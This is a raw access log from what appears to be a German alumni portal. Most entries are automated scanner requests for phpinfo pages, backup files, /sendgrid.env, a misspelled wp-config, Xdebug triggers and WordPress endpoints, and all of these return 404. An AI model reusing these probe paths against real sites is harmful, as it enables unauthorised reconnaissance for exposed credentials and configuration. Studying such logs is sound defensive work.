043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:19;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:20;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:20;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:20;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:20;;/site/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:20;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:20;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:20;;/www/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:20;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:20;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:20;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:20;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:20;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:20;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:20;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:20;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:20;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:20;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:21;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:21;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:21;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:21;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:21;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:21;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:21;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:21;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:21;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:21;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:21;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:21;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:21;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:21;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:21;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:21;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:21;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:21;;/site/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:21;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:21;;/www/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:21;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:22;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:22;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:23;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:23;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:23;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:23;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:23;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:23;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:23;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:23;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:23;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:23;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:23;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:23;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:23;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:23;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:23;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:23;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:23;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:24;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:24;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:24;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:24;;/www/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:24;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:24;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:24;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:24;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:24;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:24;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:24;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:24;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:24;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:24;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:24;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:24;;/site/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:29;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:29;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:29;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:29;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:29;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:31;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:31;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:31;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:31;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:31;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:31;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:34;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:34;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:35;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:35;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:35;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:35;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:35;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:35;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:36;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:36;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:36;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:36;;/site/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:36;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:36;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:36;;/www/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:38;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:38;;/www/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:38;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:38;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:38;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:38;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:39;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:42;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:42;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:42;;/site/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:50:00;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:50:00;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:50:00;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:50:00;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:50:00;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:50:00;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:50:00;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:50:00;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:50:00;;/public/info.php;GET;404
192a5b76500ab1af5ad5496045beb78a12011ea54d7bacee25d31bc8e0bd47c3;2025-11-16 22:50:05;;/personen/alumni/schule/66345;GET;200
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:50:08;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:50:08;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:50:08;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:50:08;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:50:09;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:50:09;;/www/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:50:13;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:50:13;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:50:13;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:50:13;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:50:13;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:50:14;;/site/info.php;GET;404
0ea4c89e30e34c9638ee01314654b8426f3383ea84300cd20f4497c30452db7c;2025-11-16 22:58:06;;/personen/alumni/schule/07A05;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-16 22:58:19;/gruppen/plausch/ai-driven-programme;/gruppen/hobby/logikspiele;GET;302
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-16 22:58:21;/gruppen/plausch/ai-driven-programme;/gruppen;GET;200
62f1b68d128294ddb8c10e270c3f6110f626411b9d49277ee0dc576b56788112;2025-11-16 23:00:32;;/;GET;200
372bcaf3828d251fb25d2cbfbfd84f3b9c7c826503528445dc3b319ec99fe2fa;2025-11-16 23:02:43;;/themen/2;GET;200
3ba70cd48dd81f25e5ee7e0d0d9576d339dbcd25a52bdc5d456ce9c9b3c150d6;2025-11-16 23:02:46;;/;GET;200
efcfb66cae366e86c506e4141a1f404e98aa14c162b32cf0cdfb21382e29fc83;2025-11-16 23:05:52;;/?WTY89=78YWF/robots.txt;GET;200
a8d97fe0f99a154ff227d2ef1640dffccd1aa7ebb7c23a5e6a80965d4d1c6a3a;2025-11-16 23:06:28;;/;GET;200
50c14d92def038a26f2daabf6d64319ad4777c3b28802b1ec2609a721e681415;2025-11-16 23:09:04;/;/;GET;200
0d2812da44ce7f0d540b65e50c2c61658901c23a5f54de97c4eea4f355579b87;2025-11-16 23:10:00;;/personen/alumni/schule/600027;GET;200
a3f7964d75549dc72a66a74fa0018647483eab378a9fa64985fbc88c68635ef3;2025-11-16 23:11:56;;/;GET;200
f24766118e548f4a46d9aed498bd919906a91fb124f8dfafbf7e664ebbde448d;2025-11-16 23:16:04;;/personen/alumni/schule/5507;GET;200
1d0005774361014c3ef5fa1ce64125ba4748f1944f3e543ee4c503096d16cb8f;2025-11-16 23:16:38;;/personen/alumni/schule/5826;GET;200
94d10329701f972a4e9560982dcbf915d8d5021b7b3e7844d5e51d93ed97c11c;2025-11-16 23:27:16;;/personen/alumni/schule/10A04;GET;200
23c4174fe4641337557aa9bb762ccb9f832c3297348d2d8bbde04c539b558067;2025-11-16 23:29:18;;/personen/alumni/schule/4440012;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-16 23:29:34;/themen?category=wissenschaft;/themen/details/wenn-sicherheit-sichtbar-wird;GET;200
373d2c3040adbb01cf965f977759d5cac211ac9ce3b76a698834759da9cf468c;2025-11-16 23:30:08;;/;GET;200
3fa6639754bb8028bd341abade387502c1ef0fa522f62b5f3917ad3bc480bba0;2025-11-16 23:30:15;;/;GET;200
95f0311e9712947ea813105308d37216106abd33460ac9ec62ff6025f157f89c;2025-11-16 23:34:37;;/bins/;GET;404
bba44843929d1a9c28fc40535c98b228b6a8909060d9cd0f0fd2f26fd973f60f;2025-11-16 23:38:58;;/personen/alumni/schule/185826;GET;200
5485fba24766240df5f46753393cc5f05f59da21a738727bb12c6d0543e84ba0;2025-11-16 23:41:04;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
85290f67fe86644f7d11f908d0346793cc493806c709b572d2f18651654e3e0e;2025-11-16 23:42:11;;/personen/alumni/schule/67933;GET;200
56a49fa60f9d0e9a4887ded69d6a327a243737c9c6e17f8816a653b999a98fed;2025-11-16 23:42:56;;/themen;GET;200
991fc555599b1655263a4b24589738462d4ab06819ba0f736082baac96c66f65;2025-11-16 23:49:07;;/personen/alumni/schule/191073;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-16 23:49:30;/gruppen/plausch/ai-driven-programme;/gruppen/hobby/astronomie;GET;302
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-16 23:49:31;/gruppen/plausch/ai-driven-programme;/gruppen;GET;200
d4903c41d93c8fb8ea3b71feb2858da18430b8137054541a5630568055fc3957;2025-11-16 23:52:23;;/themen/details/der-start-ins-studium;GET;200
5ce8d5931cfb7f6abb14de4abae5cecfdb33c80a7362fd2a1ae93da9a860369b;2025-11-16 23:53:54;/;/;GET;200
0720e93c279e3af3fd7d18178f7d9428f0a870dcb170ae77781550d08ba3bbf6;2025-11-16 23:55:18;;/themen/details/abschied-aus-moabit;GET;200
5c180414c2ddc1916777c296d73c74887d2b4b4f6e320dd33c2e77336edea562;2025-11-16 23:55:56;;/;GET;200
94d10329701f972a4e9560982dcbf915d8d5021b7b3e7844d5e51d93ed97c11c;2025-11-16 23:56:18;;/veranstaltungen;GET;200
7fc14d49b868fcd06280763882580a0696ba7d7a1172cfe84d6da2a7d8b6ebb8;2025-11-16 23:58:11;;/personen/alumni/schule/191073;GET;200
834632ccda6f506d3095672bc914276848ea1fe922049d1f6df9e6f34a3c7728;2025-11-17 00:06:53;;/aktuelles/stellenangebote;GET;200
ac1021e770633ff69bd6b5c57d918fa1dac8acac4e787c186993bda4c3c0d4cd;2025-11-17 00:07:21;;/personen/alumni/schule/01A04;GET;200
e3cf07b278a84981e8c1343fbaa99f664449f50d160c3a1d89aed3a4cfe5ec88;2025-11-17 00:13:04;;/personen/alumni/schule/4240628;GET;200
094939c7719a27c29c2962f0d1e3c4bfc8f018ef1720f8b630feb5b2ad7dd40b;2025-11-17 00:15:10;;/personen;GET;200
a14bc5cdeb1d0cf62840062b8dcccc98101a1be52207dfef5dd4d69a187291fb;2025-11-17 00:17:03;;/personen/alumni/schule/5503;GET;200
82328f5d32ab047a6a42de6c81bb8adcb8324dd1b10de5ee991b3b0a1593870f;2025-11-17 00:25:18;;/personen/alumni/schule/9004;GET;200
a12e806bd38a2b194345758b0a7f5edf3e35491d794f21ae9627a67aa052f568;2025-11-17 00:25:42;;/personen/alumni/schule/67210;GET;200
b245f7184e3156e183fa5cb08e5ed088335afd7baeb00e130b91c3c67c0b083d;2025-11-17 00:28:36;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
08fb9e7a94938ee9167083457dfafeeb07fcc029e657d94aac4bd0be20d4b343;2025-11-17 00:34:01;;/personen/alumni/schule/04A04;GET;200
d5c17729f33c534ac873627574687f6bff47433df74b990ee5071be32e13ffed;2025-11-17 00:38:51;;/personen/alumni/details/jessica-schwarz;GET;200
f0c3aafa2979d3e013ac78f451319a4cea70dccda4157b9bd8e88fea676d3e0e;2025-11-17 00:43:56;;/personen/alumni/schule/0350;GET;200
bc4e12af47db0ebcede74ab147c185171752e8b335f4d47d3afcf20a58b8ce91;2025-11-17 00:50:35;;/wp-confiq.php;GET;404
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-17 00:50:55;/gruppen/interesse/selbststandigkeit;/personen/alumni/details/sophia-gawron;GET;200
c8e282c7136ca1d1163fa6120a3bade2dc67c9a9b581965bfef26b3aaedd7db4;2025-11-17 00:50:56;;/;GET;200
28f9767c7fbaac70e5c933c56917e4fe9bda0dfd24522f87bec8990336546435;2025-11-17 00:51:21;;/personen/alumni/schule/5508;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-17 00:52:20;/aktuelles/meldungen;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
1a65a19379ea25b8f2ae359ec72fb02478e4fb76662dfce5e9bb58609ee8e765;2025-11-17 00:54:24;;/personen/alumni/schule/HB0001;GET;200
9bbab444dc6b73cf80fb7cf1d3d1f6741810fb9f94c9a9a8c47c2c53cd9ca9b1;2025-11-17 00:57:44;;/sitemap.xml;GET;200
e7a38aa695847f8d8988f20ecccae129eadf383b2fc59ba89c97dc54f14c0f71;2025-11-17 01:04:21;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
d0e261303c0761816729a6fc9ee23ec2e12aca45fa78c4d60eb5505c5934985e;2025-11-17 01:07:28;;/personen/alumni/schule/5506;GET;200
e5adf673e0fe39027e2cc846f671ac66bbafa0e2ce23ab2f32875148b1cf10a9;2025-11-17 01:07:34;;/sendgrid.env;GET;404
e5adf673e0fe39027e2cc846f671ac66bbafa0e2ce23ab2f32875148b1cf10a9;2025-11-17 01:07:34;;/phpinfo.php;GET;404
e5adf673e0fe39027e2cc846f671ac66bbafa0e2ce23ab2f32875148b1cf10a9;2025-11-17 01:07:34;;/phpinfo;GET;404
e5adf673e0fe39027e2cc846f671ac66bbafa0e2ce23ab2f32875148b1cf10a9;2025-11-17 01:07:34;;/php_info.php;GET;404
e5adf673e0fe39027e2cc846f671ac66bbafa0e2ce23ab2f32875148b1cf10a9;2025-11-17 01:07:34;;/_profiler/phpinfo;GET;404
e5adf673e0fe39027e2cc846f671ac66bbafa0e2ce23ab2f32875148b1cf10a9;2025-11-17 01:07:35;;/info;GET;404
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-17 01:08:22;;/?XDEBUG_SESSION_START=phpstorm;GET;200
3e4468cda8f50887cbbeaed896519373031bb119bd4b3dd2f4c805338949b5b2;2025-11-17 01:09:37;/veranstaltungen/details/sommerfest-am-treptow-kolleg;/veranstaltungen/details/sommerfest-am-treptow-kolleg;GET;200
19cb88d92ffad15b0b304ea98e343aa7ecb07042a010dea2873a1be62625d902;2025-11-17 01:15:49;;/personen/alumni/details/thomas-matzig;GET;200
08fb9e7a94938ee9167083457dfafeeb07fcc029e657d94aac4bd0be20d4b343;2025-11-17 01:19:03;;/personen/alumni/schule/MP001;GET;200
c991efdb88be0258f086ab50cd03592e02a0f07efda2478b2606aeadf72327f2;2025-11-17 01:25:26;;/personen/alumni/schule/67933;GET;200
7952c307e8a61d573e551a5b79c99c887f1e05d68a0cf2d19164af7e7cee3453;2025-11-17 01:25:42;;/;GET;200
f198120ee14806b871f3dac791e98a55fa45004db70a8f550d78a75e67a9c77c;2025-11-17 01:27:26;;/personen/alumni/schule/HS001;GET;200
84ceff70f76cf4c66bcecb22b3c5ca9c9123465a1f45f321a9c45059619134ed;2025-11-17 01:35:19;;/;GET;200
84ceff70f76cf4c66bcecb22b3c5ca9c9123465a1f45f321a9c45059619134ed;2025-11-17 01:35:21;;//wp-includes/wlwmanifest.xml;GET;404
84ceff70f76cf4c66bcecb22b3c5ca9c9123465a1f45f321a9c45059619134ed;2025-11-17 01:35:23;;//xmlrpc.php?rsd;GET;404
84ceff70f76cf4c66bcecb22b3c5ca9c9123465a1f45f321a9c45059619134ed;2025-11-17 01:35:24;;/;GET;200
84ceff70f76cf4c66bcecb22b3c5ca9c9123465a1f45f321a9c45059619134ed;2025-11-17 01:35:27;;//blog/wp-includes/wlwmanifest.xml;GET;404
84ceff70f76cf4c66bcecb22b3c5ca9c9123465a1f45f321a9c45059619134ed;2025-11-17 01:35:29;;//web/wp-includes/wlwmanifest.xml;GET;404
b8b371a672032d9dc93cea57e1d24867be43880e47610747e200141eb438f1d4;2025-11-17 01:35:29;;/personen/all/3;GET;200
84ceff70f76cf4c66bcecb22b3c5ca9c9123465a1f45f321a9c45059619134ed;2025-11-17 01:35:31;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
84ceff70f76cf4c66bcecb22b3c5ca9c9123465a1f45f321a9c45059619134ed;2025-11-17 01:35:33;;//website/wp-includes/wlwmanifest.xml;GET;404
84ceff70f76cf4c66bcecb22b3c5ca9c9123465a1f45f321a9c45059619134ed;2025-11-17 01:35:35;;//wp/wp-includes/wlwmanifest.xml;GET;404
